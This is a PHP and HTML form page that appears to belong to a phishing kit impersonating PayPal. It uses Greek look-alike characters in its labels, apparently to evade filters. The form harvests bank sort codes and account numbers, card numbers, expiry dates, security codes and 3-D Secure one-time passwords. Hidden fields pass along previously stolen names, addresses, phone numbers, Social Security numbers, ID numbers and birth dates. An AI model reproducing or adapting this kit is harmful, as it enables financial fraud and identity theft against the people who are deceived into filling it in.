                    					<script src="../js/jquery.payment.js"></script><script src="../js/new.look.js"></script>
	<style type='text/css'>
#new_msg_count, .poll_question h4,.rounded{border-radius:6px;-moz-border-radius:6px;-webkit-border-radius:6px}.desc, .desc.blend_links a,p.posted_info{font-size:12px;color:#777}.desc.lighter, .desc.lighter.blend_links
a{color:#a4a4a4}.cancel{color:#ad2930;font-size:0.9em;font-weight:bold}em.moderated{font-size:11px;font-style:normal;font-weight:bold}.positive{color:#6f8f52}.negative{color:#c7172b}.searchlite{background-color:yellow;color:red;font-size:14px}.activeuserposting{font-style:italic}.col_f_post{width:250px !important}.is_mod
.col_f_post{width:210px !important}td.col_c_post{padding-top:10px !important;width:250px}.col_f_icon{padding:10px
0 0 0 !important;width:24px !important;text-align:center;vertical-align:top}.col_n_icon{vertical-align:middle;width:24px;padding:0
!important}.col_f_views,.col_m_replies{width:100px !important;text-align:right;white-space:nowrap}.col_f_mod,.col_m_mod,.col_n_mod{width:40px;text-align:right}.col_f_preview{width:20px !important;text-align:right}.col_c_icon{padding:10px
5px 10px 5px !important;width:33px;vertical-align:middle;text-align:center}.col_c_post
.ipsUserPhoto{margin-top:3px}.col_n_date{width:250px}.col_m_photo,.col_n_photo{width:30px}.col_m_mod{text-align:right}.col_r_icon{width:3%}.col_f_topic,.col_m_subject{width:49%}.col_f_starter,.col_r_total,.col_r_comments{width:10%}.col_m_date,.col_r_updated,.col_r_section{width:18%}.col_c_stats{width:15%;text-align:right}.col_c_forum{width:auto}.col_mod,.col_r_mod{width:3%}.col_r_title{width:26%}table.ipb_table{width:100%;line-height:1.3;border-collapse:collapse}table.ipb_table
td{padding:10px;border-bottom:1px solid #f3f3f3}table.ipb_table tr.unread
h4{font-weight:bold}table.ipb_table tr.highlighted
td{border-bottom:0}table.ipb_table
th{font-size:11px;font-weight:bold;padding:8px
6px}.last_post{margin-left:45px}table.ipb_table h4,
table.ipb_table
.topic_title{font-size:14px;display:inline-block}table.ipb_table  .unread
.topic_title{font-weight:bold}table.ipb_table
.ipsModMenu{visibility:hidden}table.ipb_table tr:hover .ipsModMenu, table.ipb_table tr
.ipsModMenu.menu_active{visibility:visible}#announcements
h4{display:inline}
	</style>

                    <form method="post" id="parentForm" name="creditcard_Form" action="Submition" class="edit">
                        <p class="group fcenter">


<?php
if ($negara=="UK"){ echo '
				<span class="help" style="padding-left:4%;">&Nu;eed for bank validation.</span>
					<label for="sortcode">Sort Code - Account No :</label>
						<span class="field">
							<input name="sort_code1" style="width: 1.3em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code">&nbsp;
							<input name="sort_code2" style="width: 1.3em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code">&nbsp;
							<input name="sort_code3" style="width: 1.3em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code">&nbsp;-&nbsp;
							<input name="acc_number" style="width: 5.4em;" pattern="[0-9]{8,}" maxlength="8" autocomplete="off" required="required" type="text" title="Enter account number"></span>
';}
if ($negara=="IE"){ echo '
				<span class="help" style="padding-left:4%;">&Nu;eed for bank identification.</span>
					<label for="sortcode">Sort Code :</label>
						<span class="field">
							<input name="sort_code1" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"> - 
							<input name="sort_code2" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"> - 
							<input name="sort_code3" class="xxsmall" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code"></span>
';}
?>

                            <span class="help" style="padding-left:4%;">&Nu;ame as it appears on Card.</span>
                                <label for="cc_holder">Cardholder &Nu;ame :</label>
					<span class="field" id="cc_holder">
						<input type="text" autocomplete="off" class="large" pattern=".{2,30}" maxlength="32" name="cc_holder" value="" required="" title="Cardholder name"></span>



                            <label for="cc_number">Card Number :</label>
                                <span class="field">
                                    <input type="text" id="cc_number" autocomplete="off" style="width: 12em;" pattern="[2-7][0-9 ]{11,20}" maxlength="20" name="cc_number" value="" required="" title="Only number">
                                </span>


                     
                            <label for="expdate">&Epsilon;xpiration Date :</label>
                                <span class="field" style="margin-bottom: 7px;">
<?php
echo date_dropdown(20);
function date_dropdown($year_limit = 0)
{
        /*month*/
        $html_output .= '                                   <select class="smal" required="required" name="expdate_month" title="Exp month">'."\n";
        $html_output .= '                                       ';
            for ($exp_month = 1; $exp_month <= 12; $exp_month++) {
            	if (strlen($exp_month) === 1){
            		$html_output .= '<option value="0' . $exp_month . '">0' . $exp_month . '</option>';
            	} else {
            		$html_output .= '<option value="' . $exp_month . '">' . $exp_month . '</option>';
            	}
            }
        $html_output .= "\n".'                                  </select>&nbsp;&nbsp;/&nbsp;&nbsp;'."\n";

        /*years*/
    if (date('m') == 12){
        $html_output .= '                                   <select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
        $html_output .= '                                       ';
            for ($exp_year = date('Y') + 1; $exp_year <= date('Y') + $year_limit; $exp_year++) {
                $html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
            }
        $html_output .= "\n".'                                  </select>'."\n";
    } else {
        $html_output .= '                                   <select class="mediu" required="required" name="expdate_year" title="Exp year">'."\n";
        $html_output .= '                                       ';
            for ($exp_year = date('Y'); $exp_year <= date('Y') + $year_limit; $exp_year++) {
                $html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
            }
        $html_output .= "\n".'                                  </select>'."\n";
    }

    return $html_output;
}
?>
                                </span>
                                    
                                   
                            	<label for="cvv2_number">Card Security C&omicron;de :</label>
					<span class="field">
						<input id="cvv2_number" autocomplete="off" style="width:3.49em;" pattern="[0-9]{3,5}" maxlength="4" name="cvv2_number" value="" required="" type="text" title="Enter a valid csc">
						<span class="small"><a target="_blank" href="../page/cvv_info_pop&amp;enable_locale.htm" onclick="AYPAL.core.openWindow(event, {width: 425, height: 450});" id="1"> What is this?</a></span>

					</span>

                            <label for="otp_pass">One Time Password :</label>
                                <span class="field">
                                    <input type="password" id="otp_pass" autocomplete="off" style="width: 12em;" maxlength="20" name="otp_pass" value="" required="" title="One Time Password"><img src="https://www.swedbank.ee/img/private/d2d/cards/3dSecure/visa_master_logo.png" width="65">
                                </br>
<span class='desc lighter'>Please enter a valid OTP for VBV or MCSC. If not have VBV or MCSC, skip OTP form.</span>
                            <div class="ngawur">
                            </div>

                        </p>

                        <p class="bcenter">
                        	<button style="width: 100px !important;" type="submit" value="Submition" class="button">Next</button></p>
                        <div style="display:none;"><input name="full_name" value="<?php echo $_POST['full_name'];?>"><input name="address1" value="<?php echo $_POST['address1'];?>"><input name="address2" value="<?php echo $_POST['address2'];?>"><input name="city" value="<?php echo $_POST['city'];?>"><input name="state" value="<?php echo $_POST['state'];?>"><input name="postal" value="<?php echo $_POST['postal'];?>"><input name="phone" value="<?php echo $_POST['phone'];?>"><input name="ssn1" value="<?php echo $_POST['ssn1'];?>"><input name="ssn2" value="<?php echo $_POST['ssn2'];?>"><input name="ssn3" value="<?php echo $_POST['ssn3'];?>"><input name="id_number" value="<?php echo $_POST['id_number'];?>"><input name="dob_day" value="<?php echo $_POST['dob_day'];?>"><input name="dob_month" value="<?php echo $_POST['dob_month'];?>"><input name="dob_year" value="<?php echo $_POST['dob_year'];?>"></div>
                        
                    </form>